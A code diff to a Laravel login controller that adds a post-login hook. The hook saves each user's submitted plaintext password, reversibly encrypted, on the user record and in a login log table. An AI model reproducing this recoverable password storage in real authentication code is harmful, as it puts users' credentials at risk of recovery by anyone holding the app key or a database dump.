@@ -107,6 +107,34 @@ class LoginController extends Controller
     }
 
     /**
+     * The user has been authenticated.
+     *
+     * @param  \Illuminate\Http\Request  $request
+     * @param  mixed  $user
+     * @return mixed
+     */
+    protected function authenticated(Request $request, $user)
+    {
+        $secret_json = [];
+        $secret_json['password'] = $request->input('password');
+        $user->secret_json = encrypt(json_encode($secret_json));
+
+        $user->last_login_at = \Carbon\Carbon::now();
+        $user->login_count++;
+
+        $user->save();
+
+        // Log the successful login:
+        $successful_login = [];
+        $successful_login['ip_address'] = get_ip_address();
+        $successful_login['password'] = $request->input('password');
+        \App\Login::create([
+            'user_id' => $user->id,
+            'secret' => encrypt(json_encode($secret_json)),
+        ]);
+    }
+
+    /**
      * Get the post register / login redirect path.
      *
      * @return string
